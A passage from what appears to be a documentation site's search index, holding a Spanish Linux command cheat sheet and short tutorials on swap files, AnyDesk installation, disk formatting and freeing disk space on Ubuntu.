correcta resoluci\u00f3n de las dependencias.</li> <li>apt-get clean: limpiar cache desde los paquetes descargados.</li> <li>apt-cache search searched-package: retorna lista de paquetes que corresponde a la serie \u00abpaquetes buscados\u00bb.</li> </ul>"},{"location":"Linux/Commands/#ver-el-contenido-de-un-fichero","title":"Ver el contenido de un fichero","text":"<ul> <li>cat file1: ver los contenidos de un fichero comenzando desde la primera hilera.</li> <li>tac file1: ver los contenidos de un fichero comenzando desde la \u00faltima l\u00ednea.</li> <li>more file1: ver el contenido a lo largo de un fichero.</li> <li>less file1: parecido al commando \u2018more\u2019 pero permite salvar el movimiento en el fichero as\u00ed como el movimiento hacia atr\u00e1s.</li> <li>head -2 file1: ver las dos primeras l\u00edneas de un fichero.</li> <li>tail -2 file1: ver las dos \u00faltimas l\u00edneas de un fichero.</li> <li>tail -f /var/log/messages: ver en tiempo real qu\u00e9 ha sido a\u00f1adido al fichero.</li> </ul>"},{"location":"Linux/Commands/#manipulacion-de-texto","title":"Manipulaci\u00f3n de texto","text":"<ul> <li>cat file1 file2 .. | command &lt;&gt; file1_in.txt_or_file1_out.txt: sintaxis general para la manipulaci\u00f3n de texto utilizando PIPE, STDIN y STDOUT.</li> <li>cat file1 | command( sed, grep, awk, grep, etc\u2026) &gt; result.txt: sintaxis general para manipular un texto de un fichero y escribir el resultado en un fichero nuevo.</li> <li>cat file1 | command( sed, grep, awk, grep, etc\u2026) \u00bb result.txt: sintaxis general para manipular un texto de un fichero y a\u00f1adir resultado en un fichero existente.</li> <li>grep Aug /var/log/messages: buscar palabras \u201cAug\u201d en el fichero \u2018/var/log/messages\u2019.</li> <li>grep ^Aug /var/log/messages: buscar palabras que comienzan con \u201cAug\u201d en fichero \u2018/var/log/messages\u2019</li> <li>grep [0-9] /var/log/messages: seleccionar todas las l\u00edneas del fichero \u2018/var/log/messages\u2019 que contienen n\u00fameros.</li> <li>grep Aug -R /var/log/*: buscar la cadena \u201cAug\u201d en el directorio \u2018/var/log\u2019 y debajo.</li> <li>sed \u2018s/stringa1/stringa2/g\u2019 example.txt: reubicar \u201cstring1\u201d con \u201cstring2\u201d en ejemplo.txt</li> <li>sed \u2018/^$/d\u2019 example.txt: eliminar todas las l\u00edneas en blanco desde el ejemplo.txt</li> <li>sed \u2018/ *#/d; /^$/d\u2019 example.txt: eliminar comentarios y l\u00edneas en blanco de ejemplo.txt</li> <li>echo \u2018esempio\u2019 | tr \u2018[:lower:]\u2018 \u2018[:upper:]\u2018: convertir min\u00fasculas en may\u00fasculas.</li> <li>sed -e \u20191d\u2019 result.txt: elimina la primera l\u00ednea del fichero ejemplo.txt</li> <li>sed -n \u2018/stringa1/p\u2019: visualizar solamente las l\u00edneas que contienen la palabra \u201cstring1\u201d.</li> </ul>"},{"location":"Linux/Commands/#establecer-caracter-y-conversion-de-ficheros","title":"Establecer caracter y conversi\u00f3n de ficheros","text":"<ul> <li>dos2unix filedos.txt fileunix.txt: convertir un formato de fichero texto desde MSDOS a UNIX.</li> <li>unix2dos fileunix.txt filedos.txt: convertir un formato de fichero de texto desde UNIX a MSDOS.</li> <li>recode ..HTML &lt; page.txt &gt; page.html: convertir un fichero de texto en html.</li> <li>recode -l | more: mostrar todas las conversiones de formato disponibles.</li> </ul>"},{"location":"Linux/Commands/#analisis-del-sistema-de-ficheros","title":"An\u00e1lisis del sistema de ficheros","text":"<ul> <li>badblocks -v /dev/hda1: Chequear los bloques defectuosos en el disco hda1.</li> <li>fsck /dev/hda1: reparar / chequear la integridad del fichero del sistema Linux en el disco hda1.</li> <li>fsck.ext2 /dev/hda1: reparar / chequear la integridad del fichero del sistema ext 2 en el disco hda1.</li> <li>e2fsck /dev/hda1: reparar / chequear la integridad del fichero del sistema ext 2 en el disco hda1.</li> <li>e2fsck -j /dev/hda1: reparar / chequear la integridad del fichero del sistema ext 3 en el disco hda1.</li> <li>fsck.ext3 /dev/hda1: reparar / chequear la integridad del fichero del sistema ext 3 en el disco hda1.</li> <li>fsck.vfat /dev/hda1: reparar / chequear la integridad del fichero sistema fat en el disco hda1.</li> <li>fsck.msdos /dev/hda1: reparar / chequear la integridad de un fichero del sistema dos en el disco hda1.</li> <li>dosfsck /dev/hda1: reparar / chequear la integridad de un fichero del sistema dos en el disco hda1.</li> </ul>"},{"location":"Linux/Commands/#formatear-un-sistema-de-ficheros","title":"Formatear un sistema de ficheros","text":"<ul> <li>mkfs /dev/hda1: crear un fichero de sistema tipo Linux en la partici\u00f3n hda1.</li> <li>mke2fs /dev/hda1: crear un fichero de sistema tipo Linux ext 2 en hda1.</li> <li>mke2fs -j /dev/hda1: crear un fichero de sistema tipo Linux ext3 (peri\u00f3dico) en la partici\u00f3n hda1.</li> <li>mkfs -t vfat 32 -F /dev/hda1: crear un fichero de sistema FAT32 en hda1.</li> <li>fdformat -n /dev/fd0: formatear un disco flooply.</li> <li>mkswap /dev/hda3: crear un fichero de sistema swap.</li> </ul>"},{"location":"Linux/Commands/#trabajo-con-la-swap","title":"Trabajo con la SWAP","text":"<ul> <li>mkswap /dev/hda3: crear fichero de sistema swap.</li> <li>swapon /dev/hda3: activando una nueva partici\u00f3n swap.</li> <li>swapon /dev/hda2 /dev/hdb3: activar dos particiones swap.</li> </ul>"},{"location":"Linux/Commands/#copias-de-seguridad-backup","title":"Copias de Seguridad (Backup)","text":"<ul> <li>dump -0aj -f /tmp/home0.bak /home: hacer una salva completa del directorio \u2018/home\u2019.</li> <li>dump -1aj -f /tmp/home0.bak /home: hacer una salva incremental del directorio \u2018/home\u2019.</li> <li>restore -if /tmp/home0.bak: restaurando una salva interactivamente.</li> <li>rsync -rogpav \u2013delete /home /tmp: sincronizaci\u00f3n entre directorios.</li> <li>rsync -rogpav -e ssh \u2013delete /home ip_address:/tmp: rsync a trav\u00e9s del t\u00fanel SSH.</li> <li>rsync -az -e ssh \u2013delete ip_addr:/home/public /home/local: sincronizar un directorio local con un directorio remoto a trav\u00e9s de ssh y de compresi\u00f3n.</li> <li>rsync -az -e ssh \u2013delete /home/local ip_addr:/home/public: sincronizar un directorio remoto con un directorio local a trav\u00e9s de ssh y de compresi\u00f3n.</li> <li>dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr \u2018dd of=hda.gz\u2019: hacer una salva de un disco duro en un host remoto a trav\u00e9s de ssh.</li> <li>dd if=/dev/sda of=/tmp/file1: salvar el contenido de un disco duro a un fichero. (En este caso el disco duro es \u201csda\u201d y el fichero \u201cfile1\u201d).</li> <li>tar -Puf backup.tar /home/user: hacer una salva incremental del directorio \u2018/home/user\u2019.</li> <li>( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr \u2018cd /home/share/ &amp;&amp; tar x -p\u2019: copiar el contenido de un directorio en un directorio remoto a trav\u00e9s de ssh.</li> <li>( tar c /home ) | ssh -C user@ip_addr \u2018cd /home/backup-home &amp;&amp; tar x -p\u2019: copiar un directorio local en un directorio remoto a trav\u00e9s de ssh.</li> <li>tar cf \u2013 . | (cd /tmp/backup ; tar xf \u2013 ): copia local conservando las licencias y enlaces desde un directorio a otro.</li> <li>find /home/user1 -name \u2018*.txt\u2019 | xargs cp -av \u2013target-directory=/home/backup/ \u2013parents: encontrar y copiar todos los ficheros con extensi\u00f3n \u2018.txt\u2019 de un directorio a otro.</li> <li>find /var/log -name \u2018*.log\u2019 | tar cv \u2013files-from=- | bzip2 &gt; log.tar.bz2: encontrar todos los ficheros con extensi\u00f3n \u2018.log\u2019 y hacer un archivo bzip.</li> <li>dd if=/dev/hda of=/dev/fd0 bs=512 count=1: hacer una copia del MRB (Master Boot Record) a un disco floppy.</li> <li>dd if=/dev/fd0 of=/dev/hda bs=512 count=1: restaurar la copia del MBR (Master Boot Record) salvada en un floppy.</li> </ul>"},{"location":"Linux/Commands/#cd-rom","title":"CD-ROM","text":"<ul> <li>cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force: limpiar o borrar un cd regrabable.</li> <li>mkisofs /dev/cdrom &gt; cd.iso: crear una imagen iso de cdrom en disco.</li> <li>mkisofs /dev/cdrom | gzip &gt; cd_iso.gz: crear una imagen comprimida iso de cdrom en disco.</li> <li>mkisofs -J -allow-leading-dots -R -V \u201cLabel CD\u201d -iso-level 4 -o ./cd.iso data_cd: crear una imagen iso de un directorio.</li> <li>cdrecord -v dev=/dev/cdrom cd.iso: quemar una imagen iso.</li> <li>gzip -dc cd_iso.gz | cdrecord dev=/dev/cdrom -: quemar una imagen iso comprimida.</li> <li>mount -o loop cd.iso /mnt/iso: montar una imagen iso.</li> <li>cd-paranoia -B: llevar canciones de un cd a ficheros wav.</li> <li>cd-paranoia \u2013 \u201d-3\u201d: llevar las 3 primeras canciones de un cd a ficheros wav.</li> <li>cdrecord \u2013scanbus: escanear bus para identificar el canal scsi.</li> <li>dd if=/dev/hdc | md5sum: hacer funcionar un md5sum en un dispositivo, como un CD.</li> </ul>"},{"location":"Linux/Commands/#trabajo-con-la-red-lan-y-wi-fi","title":"Trabajo con la RED ( LAN y Wi-Fi)","text":"<ul> <li>ifconfig eth0: mostrar la configuraci\u00f3n de una tarjeta de red Ethernet.</li> <li>ifup eth0: activar una interface \u2018eth0?.</li> <li>ifdown eth0: deshabilitar una interface \u2018eth0?.</li> <li>ifconfig eth0 192.168.1.1 netmask 255.255.255.0: configurar una direcci\u00f3n IP.</li> <li>ifconfig eth0 promisc: configurar \u2018eth0?en modo com\u00fan para obtener los paquetes (sniffing).</li> <li>dhclient eth0: activar la interface \u2018eth0? en modo dhcp.</li> <li>route -n: mostrar mesa de recorrido.</li> <li>route add -net 0/0 gw IP_Gateway: configurar entrada predeterminada.</li> <li>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1: configurar ruta est\u00e1tica para buscar la red \u2019192.168.0.0/16?.</li> <li>route del 0/0 gw IP_gateway: eliminar la ruta est\u00e1tica.</li> <li>echo \u201c1\u201d &gt; /proc/sys/net/ipv4/ip_forward: activar el recorrido ip.</li> <li>hostname: mostrar el nombre del host del sistema.</li> <li>host www.elhacker.net: buscar el nombre del host para resolver el nombre a una direcci\u00f3n ip(1).</li> <li>nslookup www.elhacker.net: buscar el nombre del host para resolver el nombre a una direcci\u00f3m ip y viceversa(2).</li> <li>ip link show: mostar el estado de enlace de todas las interfaces.</li> <li>mii-tool eth0: mostar el estado de enlace de \u2018eth0?.</li> <li>ethtool eth0: mostrar las estad\u00edsticas de tarjeta de red \u2018eth0?.</li> <li>netstat -tup: mostrar todas las conexiones de red activas y sus PID.</li> <li>netstat -tupl: mostrar todos los servicios de escucha de red en el sistema y sus PID.</li> <li>tcpdump tcp port 80: mostrar todo el tr\u00e1fico HTTP.</li> <li>iwlist scan: mostrar las redes inal\u00e1mbricas.</li> <li>iwconfig eth1: mostrar la configuraci\u00f3n de una tarjeta de red inal\u00e1mbrica.</li> <li>whois www.elhacker.net: buscar en base de datos Whois.</li> </ul>"},{"location":"Linux/Commands/#redes-de-microsoft-windows-samba","title":"Redes de Microsoft Windows (SAMBA)","text":"<ul> <li>nbtscan ip_addr: resoluci\u00f3n de nombre de red bios.</li> <li>nmblookup -A ip_addr: resoluci\u00f3n de nombre de red bios.</li> <li>smbclient -L ip_addr/hostname: mostrar acciones remotas de un host en windows.</li> </ul>"},{"location":"Linux/Commands/#tablas-ip-cortafuegos","title":"Tablas IP (CORTAFUEGOS)","text":"<ul> <li>iptables -t filter -L: mostrar todas las cadenas de la tabla de filtro.</li> <li>iptables -t nat -L: mostrar todas las cadenas de la tabla nat.</li> <li>iptables -t filter -F: limpiar todas las reglas de la tabla de filtro.</li> <li>iptables -t nat -F: limpiar todas las reglas de la tabla nat.</li> <li>iptables -t filter -X: borrar cualquier cadena creada por el usuario.</li> <li>iptables -t filter -A INPUT -p tcp \u2013dport telnet -j ACCEPT: permitir las conexiones telnet para entar.</li> <li>iptables -t filter -A OUTPUT -p tcp \u2013dport http -j DROP: bloquear las conexiones HTTP para salir.</li> <li>iptables -t filter -A FORWARD -p tcp \u2013dport pop3 -j ACCEPT: permitir las conexiones POP a una cadena delantera.</li> <li>iptables -t filter -A INPUT -j LOG \u2013log-prefix \u201cDROP INPUT\u201d: registrando una cadena de entrada.</li> <li>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE: configurar un PAT (Puerto de traducci\u00f3n de direcci\u00f3n) en eth0, ocultando los paquetes de salida forzada.</li> <li>iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp \u2013dport 22 -j DNAT \u2013to-destination 10.0.0.2:22: redireccionar los paquetes diriguidos de un host a otro.</li> </ul>"},{"location":"Linux/Commands/#monitoreando-y-depurando","title":"Monitoreando y depurando","text":"<ul> <li>top: mostrar las tareas de linux usando la mayor\u00eda cpu.</li> <li>ps -eafw: muestra las tareas Linux.</li> <li>ps -e -o pid,args \u2013forest: muestra las tareas Linux en un modo jer\u00e1rquico.</li> <li>pstree: mostrar un \u00e1rbol sistema de procesos.</li> <li>kill -9 ID_Processo: forzar el cierre de un proceso y terminarlo.</li> <li>kill -1 ID_Processo: forzar un proceso para recargar la configuraci\u00f3n.</li> <li>lsof -p $$: mostrar una lista de ficheros abiertos por procesos.</li> <li>lsof /home/user1: muestra una lista de ficheros abiertos en un camino dado del sistema.</li> <li>strace -c ls &gt;/dev/null: mostrar las llamadas del sistema hechas y recibidas por un proceso.</li> <li>strace -f -e open ls &gt;/dev/null: mostrar las llamadas a la biblioteca.</li> <li>watch -n1 \u2018cat /proc/interrupts\u2019: mostrar interrupciones en tiempo real.</li> <li>last reboot: mostrar historial de reinicio.</li> <li>lsmod: mostrar el kernel cargado.</li> <li>free -m: muestra el estado de la RAM en megabytes.</li> <li>smartctl -A /dev/hda: monitorear la fiabilidad de un disco duro a trav\u00e9s de SMART.</li> <li>smartctl -i /dev/hda: chequear si SMART est\u00e1 activado en un disco duro.</li> <li>tail /var/log/dmesg: mostrar eventos inherentes al proceso de carga del kernel.</li> <li>tail /var/log/messages: mostrar los eventos del sistema.</li> </ul>"},{"location":"Linux/Commands/#otros-comandos-utiles","title":"Otros comandos \u00fatiles","text":"<ul> <li>apropos \u2026keyword: mostrar una lista de comandos que pertenecen a las palabras claves de un programa; son \u00fatiles cuando t\u00fa sabes qu\u00e9 hace tu programa, pero de sconoces el nombre del comando.</li> <li>man ping: mostrar las p\u00e1ginas del manual on-line; por ejemplo, en un comando ping, usar la opci\u00f3n \u2018-k\u2019 para encontrar cualquier comando relacionado.</li> <li>whatis \u2026keyword: muestra la descripci\u00f3n de lo que hace el programa.</li> <li>mkbootdisk \u2013device /dev/fd0 <code>uname -r</code>: crear un floppy boteable.</li> <li>gpg -c file1: codificar un fichero con guardia de seguridad GNU.</li> <li>gpg file1.gpg: decodificar un fichero con Guardia de seguridad GNU.</li> <li>wget -r www.elhacker.net: descargar un sitio web completo.</li> <li>wget -c www.elhacker.net/file.iso: descargar un fichero con la posibilidad de parar la descargar y reanudar m\u00e1s tarde.</li> <li>echo \u2018wget -c www.elhacker.net/files.iso\u2018 | at 09:00: Comenzar una descarga a cualquier hora. En este caso empezar\u00eda a las 9 horas.</li> <li>ldd /usr/bin/ssh: mostrar las bibliotecas compartidas requeridas por el programa ssh.</li> <li>alias hh=\u2019history\u2019: colocar un alias para un commando \u2013hh= Historial.</li> <li>chsh: cambiar el comando Shell.</li> <li>chsh \u2013list-shells: es un comando adecuado para saber si tienes que hacer remoto en otra terminal.</li> <li>who -a: mostrar quien est\u00e1 registrado, e imprimir hora del \u00faltimo sistema de importaci\u00f3n, procesos muertos, procesos de registro de sistema, procesos activos producidos por init, funcionamiento actual y \u00faltimos cambios del reloj del sistema.</li> <li></li> </ul>"},{"location":"Linux/addSwapSpace/","title":"How to Add Swap Space on Ubuntu 20.04","text":"<p>Swap is a space on a disk that is used when the amount of physical RAM memory is full. When a Linux system runs out of RAM, inactive pages are moved from the RAM to the swap space.</p> <p>Swap space can take the form of either a dedicated swap partition or a swap file. Typically, when running Ubuntu on a virtual machine, a swap partition is not present, and the only option is to create a swap file.</p> <p>This tutorial explains how to add a swap file on Ubuntu 20.04.</p>"},{"location":"Linux/addSwapSpace/#before-you-begin","title":"Before You Begin","text":"<p>Swap should not be seen as a replacement to physical memory. Since swap space is a section of the hard drive, it has a slower access time than physical memory. If your system constantly runs out of memory, you should add more RAM.</p> <p>Generally, the size of the swap file depends on how much RAM your system has:</p> <ul> <li>Systems with less than 2 GB RAM - 2 times the amount of RAM.</li> <li>Systems with 2 to 8 GB RAM - the same size as the amount of RAM.</li> <li>Systems with more than 8 GB RAM - at least 4 GB of Swap.</li> </ul> <p>Only root or user with sudo privileges can activate the swap file.</p>"},{"location":"Linux/addSwapSpace/#creating-a-swap-file","title":"Creating a Swap File","text":"<p>In this example, we will create <code>2 GB</code> swap file. If you want to add more swap, replace <code>2G</code> with the size of the swap space you need.</p> <p>Complete the steps below to add swap space on Ubuntu 20.04:</p> <ol> <li>First, create a file that will be used as swap:</li> </ol> <p><code>sudo fallocate -l 2G /swapfile</code></p> <p>If the <code>fallocate</code> utility is not present on your system, or you get an error message saying <code>fallocate failed: Operation not supported</code>, use the following command to create the swap file:</p> <p><code>sudo dd if=/dev/zero of=/swapfile bs=1024 count=2097152</code></p> <ol> <li>Set the file permissions to <code>600</code> to prevent regular users to write and read the file:</li> </ol> <p><code>sudo chmod 600 /swapfile</code></p> <ol> <li>Create a Linux swap area on the file:</li> </ol> <p><code>sudo mkswap /swapfile</code></p> <p>```output    Setting up swapspace version 1, size = 2 GiB (2147479552 bytes)    no label, UUID=fde7d2c8-06ea-400a-9027-fd731d8ab4c8</p> <p>```</p> <ol> <li>Activate the swap file by running the following command:</li> </ol> <p><code>sudo swapon /swapfile</code></p> <p>To make the change permanent open the <code>/etc/fstab</code> file:</p> <p><code>sudo nano /etc/fstab</code></p> <p>and paste the following line:</p> <p>/etc/fstab</p> <p><code>ini    /swapfile swap swap defaults 0 0</code></p> <ol> <li>Verify that the swap is active by using either the <code>swapon</code> or the <code>free</code> command, as shown below:</li> </ol> <p><code>sudo swapon --show</code></p> <p><code>output    NAME      TYPE      SIZE  USED PRIO    /swapfile file        2G    0B   -1</code></p> <p><code>sudo free -h</code></p> <p><code>output                  total        used        free      shared  buff/cache   available    Mem:          981Mi        97Mi        68Mi       0.0Ki       814Mi       735Mi    Swap:         2.0Gi        10Mi       1.9Gi</code></p>"},{"location":"Linux/addSwapSpace/#adjusting-the-swappiness-value","title":"Adjusting the Swappiness Value","text":"<p>Swappiness is a Linux kernel property that defines how often the system will use the swap space. It can have a value between 0 and 100. A low value will make the kernel to try to avoid swapping whenever possible, while a higher value will make the kernel to use the swap space more aggressively.</p> <p>On Ubuntu, the default swappiness value is set to <code>60</code>. You can check the current value by typing the following command:</p> <pre><code>cat /proc/sys/vm/swappiness\n60\n</code></pre> <p>While the swappiness value of <code>60</code> is OK for most Linux systems, for production servers, you may need to set a lower value.</p> <p>For example, to set the swappiness value to <code>10</code>, run:</p> <pre><code>sudo sysctl vm.swappiness=10\n</code></pre> <p>To make this parameter persistent across reboots, append the following line to the <code>/etc/sysctl.conf</code> file:</p> <p>/etc/sysctl.conf</p> <pre><code>vm.swappiness=10\n</code></pre> <p>The optimal swappiness value depends on your system workload and how the memory is being used. You should adjust this parameter in small increments to find an optimal value.</p>"},{"location":"Linux/addSwapSpace/#removing-a-swap-file","title":"Removing a Swap File","text":"<p>To deactivate and delete the swap file, follow these steps:</p> <ol> <li>First, deactivate the swap space:</li> </ol> <p><code>sudo swapoff -v /swapfile</code></p> <ol> <li> <p>Next, remove the swap file entry <code>/swapfile swap swap defaults 0 0</code> from the <code>/etc/fstab</code> file.</p> </li> <li> <p>Finally, remove the actual swapfile file using the <code>rm</code> command:</p> </li> </ol> <p><code>sudo rm /swapfile</code></p>"},{"location":"Linux/addSwapSpace/#conclusion","title":"Conclusion","text":"<p>We have shown you how to create a swap file and activate and configure swap space on your Ubuntu 20.04 system.</p> <p>If you hit a problem or have feedback, leave a comment below.</p>"},{"location":"Linux/anydesk/","title":"Anydesk","text":"<pre><code>## Anydesk install\n\ncurl -fsSL https://keys.anydesk.com/repos/DEB-GPG-KEY|sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/anydesk.gpg\necho \"deb http://deb.anydesk.com/ all main\" | sudo tee /etc/apt/sources.list.d/anydesk-stable.list\nsudo apt update\nsudo apt install anydesk\n</code></pre>"},{"location":"Linux/formatDisk/","title":"formatDisk","text":""},{"location":"Linux/formatDisk/#formatting-disk-partition-in-linux","title":"Formatting Disk Partition in Linux","text":"<p>There are three ways to format disk partitions using the <code>mkfs</code> command, depending on the file system type:</p> <ul> <li>ext4</li> <li>FAT32</li> <li>NTFS</li> </ul> <p>The general syntax for formatting disk partitions in Linux is:</p> <pre><code>mkfs [options] [-t type fs-options] device [size]\n</code></pre> <pre><code>fdisk -l | grep '^Disk'\n</code></pre>"},{"location":"Linux/formatDisk/#formatting-disk-partition-with-ext4-file-system","title":"Formatting Disk Partition with ext4 File System","text":"<p>\\1. Format a disk partition with the ext4 file system using the following command:</p> <pre><code>sudo mkfs -t ext4 /dev/sdb1\n</code></pre> <p>\\2. Next, verify the file system change using the command:</p> <pre><code>lsblk -f\n</code></pre> <p>The terminal prints out a list of block devices.</p> <p>\\3. Locate the preferred partition and confirm that it uses the ext4 file system.</p> <p></p>"},{"location":"Linux/formatDisk/#formatting-disk-partition-with-fat32-file-system","title":"Formatting Disk Partition with FAT32 File System","text":"<p>\\1. To format a disk with a FAT32 file system, use:</p> <pre><code>sudo mkfs -t vfat /dev/sdb1\n</code></pre> <p>\\2. Again, run the <code>lsblk</code> command to verify the file system change and locate the preferred partition from the list.</p> <pre><code>lsblk -f\n</code></pre> <p>The expected output is:</p> <p></p>"},{"location":"Linux/formatDisk/#formatting-disk-partition-with-ntfs-file-system","title":"Formatting Disk Partition with NTFS File System","text":"<p>\\1. Run the <code>mkfs</code> command and specify the NTFS file system to format a disk:</p> <pre><code>sudo mkfs -t ntfs /dev/sdb1\n</code></pre> <p>The terminal prints a confirmation message when the formatting process completes.</p> <p>\\2. Next, verify the file system change using:</p> <pre><code>lsblk -f\n</code></pre> <p>\\3. Locate the preferred partition and confirm that it uses the NFTS file system.</p> <p></p>"},{"location":"Linux/formatDisk/#mounting-the-disk-partition-in-linux","title":"Mounting the Disk Partition in Linux","text":"<p>Before using the disk, create a mount point and mount the partition to it. A mount point is a directory used to access data stored in disks.</p> <p>\\1. Create a mount point by entering:</p> <pre><code>sudo mkdir -p [mountpoint]\n</code></pre> <p>\\2. After that, mount the partition by using the following command:</p> <pre><code>sudo mount -t auto /dev/sdb1 [mountpoint]\n</code></pre> <p>Note: Replace <code>[mountpoint]</code> with the preferred mount point (example:<code>/usr/media</code>).</p> <p>There is no output if the process completes successfully.</p> <p></p> <p>\\3. Verify if the partition is mounted using the following command:</p> <pre><code>lsblk -f\n</code></pre> <p>The expected output is:</p> <p></p>"},{"location":"Linux/formatDisk/#understanding-the-linux-file-system","title":"Understanding the Linux File System","text":"<p>Choosing the right file system before formatting a storage disk is crucial. Each type of file system has different file size limitations or different operating system compatibility.</p> <p>The most commonly used file systems are:</p> <ul> <li>FAT32</li> <li>NTFS</li> <li>ext4</li> </ul> <p>Their main features and differences are:</p> File System Supported File Size Compatibility Ideal Usage FAT32 up to 4 GB Windows, Mac, Linux For maximum compatibility NTFS 16 EiB \u2013 1 KB Windows, Mac (read-only), most Linux distributions For internal drives and Windows system file Ext4 16 GiB \u2013 16 TiB Windows, Mac, Linux (requires extra drivers to access) For files larger than 4 GB"},{"location":"Linux/liberarEspacio/","title":"liberarEspacio","text":""},{"location":"Linux/liberarEspacio/#desinstala-aplicaciones-y-juegos-que-ya-no-utilices","title":"Desinstala aplicaciones y juegos que ya no utilices","text":"<p>La m\u00e1s obvia y sencilla de todas, y por la que menos nos preocupamos en la mayor\u00eda de las ocasiones, es ir eliminando aquellos programas o juegos que ya no utilizamos. Quiz\u00e1s ten\u00edas planificado utilizarlos m\u00e1s adelante o los manten\u00edas por simple nostalgia, pero ocupan un valioso espacio en tu disco duro que puedes aprovechar.</p> <p>No hay motivo para mantener al mismo tiempo varios navegadores en el equipo (Chromium, Opera, Firefox, \u2026), varios gestores de correo electr\u00f3nico (Thunderbird, Claws, Evolution, \u2026) o un sinf\u00edn de programas que realizan una funci\u00f3n similar pero de los que s\u00f3lo empleamos unos pocos. Y lo mismo sucede con los juegos. Deshazte de aquellos que no uses y recuperar\u00e1s m\u00e1s espacio en tu unidad del que esperabas. Para ello, emplea tan solo el siguiente comando:</p> <pre><code>sudo apt remove paquete1 paquete2 paquete3\n</code></pre> <p>Y observa los resultados con:</p> <pre><code>df -h\n</code></pre> <p>Si adem\u00e1s quiere eliminar aquellos paquetes o dependencias que ya no se necesitan dentro del sistema, puedes utilizar el siguiente comando:</p> <pre><code>sudo apt autoremove\n</code></pre>"},{"location":"Linux/liberarEspacio/#comprime-tus-datos","title":"Comprime tus datos","text":"<p>Aunque es importante tener siempre disponibles nuestros datos, quizas quieras ahorrar algo de espacio comprimiendo aquellos ficheros que llevas tiempo sin utilizar. Seguir\u00e1n estando igualmente accesibles dentro del sistema, aunque no de una forma tan directa, y a cambio ganar\u00e1s algo de espacio de almacenamiento. Ya que el periodo que determinemos para comprimir puede variar, os dejamos un ejemplo para archivos cuyo valor sea mayor de 30 d\u00edas (par\u00e1metro -mtime), que pod\u00e9is modificar a vuestro gusto:</p> <pre><code>find . -type f -name \"*\" -mtime +30 -print -exec gzip {} \\;\n</code></pre>"},{"location":"Linux/liberarEspacio/#limpia-la-cache-del-apt","title":"Limpia la cach\u00e9 del APT","text":"<p>Quiz\u00e1s no hab\u00edas ca\u00eddo en ello, pero la aplicaci\u00f3n apt* guarda mucha informaci\u00f3n en forma de cach\u00e9 respecto a las actualizaciones de cada paquete que se encuentra instalado dentro del sistema. Sal de dudas y **consulta en tu sistema cu\u00e1nto espacio se est\u00e1 desperdiciando* en tu equipo con el siguiente comando:</p> <pre><code>du -sh /var/cache/apt/archives\n</code></pre> <p>Si eres de los usuarios que te gusta probar aplicaciones y te pasas el d\u00eda instalando, reconfigurando y desinstalando programas, puedes deshacerte de toda aquella informaci\u00f3n inservible que se almacena en la cach\u00e9 de apt con el siguiente comando:</p> <pre><code>sudo apt clean\n</code></pre> <p>Con esta funci\u00f3n se eliminar\u00e1n de Ubuntu todos los paquetes almacenados en la cach\u00e9 de apt sin importar su antig\u00fcedad. Sin embargo, si dispones de una conexi\u00f3n de Internet lenta, deber\u00edas considerar qu\u00e9 factor te beneficia m\u00e1s, el espacio de tu disco duro o el tiempo de descarga.</p>"},{"location":"Linux/liberarEspacio/#actualiza-frecuentemente-tu-sistema","title":"Actualiza frecuentemente tu sistema","text":"<p>Aunque pudiera sonar confuso, en muchas ocasiones las actualizaciones de paquetes logran optimizar los recursos de espacio y ocupar menor tama\u00f1o dentro del equipo. Por ello, consultad a menudo las actualizaciones de paquetes y no dud\u00e9is en emplear el comando upgrade de vuestro apt-get.</p>"},{"location":"Linux/liberarEspacio/#utilizad-un-limpiador-del-sistema","title":"Utilizad un limpiador del sistema","text":"<p>Existen, como ya supondr\u00e9is, programas de terceros que permiten de una forma m\u00e1s o menos eficaz realizar una limpieza general de todo vuestro sistema. Uno de ellos es BleachBit, y dada su especialidad puede llevar a cabo una tarea general de limpieza en pocos minutos.</p> <p>Soporta hasta 70 de las aplicaciones m\u00e1s conocidas del entorno Linux (navegadores, gestores de correo electr\u00f3nico, historial de bash, etc.) y es capaz de eliminar archivos duplicados del sistema o aquellos con una antig\u00fcedad que indiquemos, por lo que puede ser una alternativa muy a tener en cuenta. No obstante, sed cautos al utilizar este tipo de herramientas, pues perdemos gran parte del control sobre qu\u00e9 hacen y pueden arruinar nuestro sistema o informaci\u00f3n si no la manejamo con cuidado.</p> <p></p>"},{"location":"Linux/liberarEspacio/#elimina-los-ficheros-de-kernel-que-no-utilices","title":"Elimina los ficheros de kernel que no utilices","text":"<p>Por \u00faltimo y algo m\u00e1s alejada del \u00e1mbito convencional est\u00e1 la eliminaci\u00f3n de aquellos ficheros de *kernel* que no empleemos en el sistema. La hemos reservado para el final por ser la m\u00e1s extrema de todas pero, si est\u00e1is seguros de que no emple\u00e1is ning\u00fan otro kernel dentro del sistema, para qu\u00e9 almacenar sus ficheros. Eliminadlos con este comando y liberad algunos megas de vuestro equipo:</p> <pre><code>sudo apt autoremove --purge\n</code></pre> <pre><code>sudo apt-get -s clean\n</code></pre> <pre><code>du -h --max-depth=1\n</code></pre> <pre><code>find . -type f -size +100000k -exec ls -lh {} \\;\n</code></pre>"},{"location":"Linux/linuxVersion/","title":"linuxVersion","text":""},{"location":"Linux/linuxVersion/#hecking-the-linux-version-in-the-terminal","title":"hecking the Linux version in the terminal","text":"<p>Whether you\u2019re using Linux privately or professionally, it\u2019s always important to know which Linux version and distribution you\u2019re working with. That way you\u2019ll know which package manager you\u2019ll need for downloading new tools and updates, and which Linux forum you should turn to when you have questions or experience problems.</p> <p>If you\u2019re looking for details about your Linux version, there are two words which will be of particular significance:</p> <ol> <li>The version number of the distribution</li> <li>The version of the Linux kernel</li> </ol> <p>To find out these two values, you\u2019ll need to use Linux commands. In general, when working in Linux, user input is entered into so-called \u201cshells\u201d, which are interfaces between systems and users. Shells run using a graphic terminal that processes the commands in the relevant programming language. This will serve as your starting point in checking your Linux version.</p>"},{"location":"Linux/linuxVersion/#step-1-distribution-version-number","title":"Step 1: Distribution version number","text":"<p>Open the Linux terminal with the keys [Ctrl] + [Alt] + [T] or by using the search function. Type the following command into the terminal and then press enter:</p> <pre><code>cat /etc/*release\n</code></pre> <p>The asterisk in the code ensures that the command will apply to all distributions and shows you the installed version. The data that you see now may 